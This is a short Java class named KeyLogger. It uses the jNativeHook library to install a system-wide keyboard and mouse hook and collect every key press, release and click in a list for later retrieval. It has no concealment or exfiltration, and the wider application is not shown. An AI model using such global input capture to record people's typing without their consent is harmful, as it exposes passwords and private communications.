package controllers;

import java.util.LinkedList;
import java.util.List;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseInputListener;

public class KeyLogger implements NativeKeyListener, NativeMouseInputListener{
	
	private LinkedList<String> lastOperations;
	
	public KeyLogger() {
		registerNativeHook();
		lastOperations = new LinkedList<>();
	}
	
	private void registerNativeHook() {
		try {
            /* Register jNativeHook */
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            /* Its error */
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }
		
		GlobalScreen.addNativeKeyListener(this);
        GlobalScreen.addNativeMouseListener(this);
	}
	
	public LinkedList<String> getLastOperations() {
			
		LinkedList<String> clone = (LinkedList<String>) lastOperations.clone();
		lastOperations.clear();
		return clone;
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		lastOperations.add("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode())); 
		
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		lastOperations.add("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode())); 
		
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void nativeMouseClicked(NativeMouseEvent e) {
		lastOperations.add(e.getButton() + " clicked " + e.getClickCount() + " times");
	}

	@Override
	public void nativeMousePressed(NativeMouseEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void nativeMouseReleased(NativeMouseEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void nativeMouseDragged(NativeMouseEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void nativeMouseMoved(NativeMouseEvent arg0) {
		// TODO Auto-generated method stub
		
	}

}
